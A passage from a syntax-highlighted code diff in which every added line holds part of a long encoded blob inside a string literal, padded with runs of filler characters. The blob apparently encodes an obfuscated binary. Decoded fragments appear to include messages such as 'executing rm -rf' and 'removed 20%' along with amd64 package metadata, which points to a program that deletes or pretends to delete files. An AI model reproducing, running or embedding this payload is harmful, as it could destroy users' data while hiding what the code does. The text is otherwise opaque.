+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNCZCUicVt_jV
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>FVfS7F3NNRvSjUDP/4OVt3DVjjNNNNNN/mIlYjNN/lI5YjNNQk4NNCZCUicbNNNNNBav////McQm
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Qk21nNRNNNQc5i///7nD3j3r_ztPNNNN1pY///4zxCZCUicbNjNNNBzl////McQmQk21nNDNNNQc
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>bi///7nD3j3r_ztSNNNN1MY///4zxCZCUie/WI9iNNOzQk4RNNQmQk21/lK_YtNNMt3sENNN3j3r
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>_i3y4v9NNTLCU5DNNCZCUie/Wr9hNNOzQk4RNNQmQk21/lKzYtNNMt3sENNN3j3r_i3y8v9NNTLC
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>U5DNNCZCUie/WqLhNNOzQk4RNNQmQk21Zr6WvqSrFVavFVCx3SOHEGUNZpyVwG8XNNNN/kJmYtNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>4TLhQk_RNNNNNNOVwG8MYtNNFV5S5v9NNRt0_UDIFVfSyv9NNRvSjUDW/_NCU9NNNNNNjj3stNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNOVwG7cYtNNFV56bv9NNRtc/xvW3RwO2w4VjstQFNUTFAU_qOEVvjIyYtNNFVKNqNw/9TLCU5DN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NZZCU9NNNNNN3j3r_bN4MF9NNNO6X6IVtm6PYtNNNRvW0KDZFVf4Ev9NNBwW/i//1TG////TOG5h
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNOKpZCUjQQQk_NNNNNNCZCUiecq/////ZCUicIFVayFVCfpTEVvjDyXNNNNRvWEstkjZMS5SCT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>EqSYkxKFYpMS55CTEqESkxKIHfMS6yGTEqq2kxKLnZMS7GGTEqclkxKoMZMS8TCTEq5jkxKrMZMS
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>8mCTErOxkxKuK3MS9aQTErAfkxKxAZMS0GUTErMhkxKaA3MS1QCTEry9kxKdA3MS188TErjNFV5S
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>uD5NNRvWk2tNNNNN1QG_//4VwHJjFVaTFV5SqD5NNRvWk2tNNNNN1Qa_//4VhUAyL8WyqNNNhtNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNOVvHJDFVyIzToUEnNNNRvAIMOVwHJjFVaJFVaU1Ca4//_SjN_ShNNNNRvAOFjANNOVvpsbfi8/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>/23ONNNN1Cw4//4VwDHzQDNNFVaUhNNNNNQbgC8//23ONNNN1Ae4//4VwDHJQDNNFVaUhNNNNNQb
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>yi8//23ONNNN1Ym4//4VwDHTQDNNFVaUhNNNNNQbrC8//23ONNNN1W24//4VwDK7QNNNFVaUhNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNQbJi8//23ONNNN1VQ4//4VwDKzQNNNFVaUhNNNNNQbCC8//5vAEqOVvpsbRC8//2tNNNNN1jJ9
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NDNNNRvYIsuxFPfHWFtNNNO5OrtN/s//lpZNNCZCUicVt_jVFVCRPZZNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN</span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNONNVNpTSmp8qipzD1VNNy
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>pjOyrTIwqKEcozptpz5tYKWzVP3NpzIgo8MyMPNlZPHyPtOlMJ6iqzIxVQDjWFHXNUWyoJ47MJDt
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>AwNyWDbNpzIgo8MyMPN9ZPHyPtOlMJ6iqzIxVQRjZPHyPtNOTjZ2ZNNNNNHNNNP52///MNNNNPGj
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>//_ZNNNNACQ//1DNNNPH3C//GNNNNU8k//_3NNNNSNNNNNNNNNNOryVNNKtDNEfZOjvDNDNNSNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NOjNNNON3C//WtNNNNOROkNNNNNNWNNNNQDNNNOV2///pNNNNNNBRRLBTRbCP8pVtNN/TwxdZlDv
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNODNNNOpNNNNxB///kNNNNNNNNNNNNNNNODNNNO5NNNNvB///7NNNNNNNNNNNNNNNOjNNNPZ
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNhsQ//3xONNNNED9DutWQQDLQjNRZOjtNNNNNNNDNNNNDNNNNNDNNNRqBIDNNNNNNNjNNNNVN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNONNNNTNNNNO_Ti2XExECNUfvqUyjMFV1VzEyLvVfVz4mVwbvqJW6oaE6VvjvozSgMFV1
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>VzqfnJWwVvjvqzIlp7yiovV1VwVhAQRgAaIvqJ05qGRvYPWupzAbnKEyL8E6pzHvBvWuoJD7APW4
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
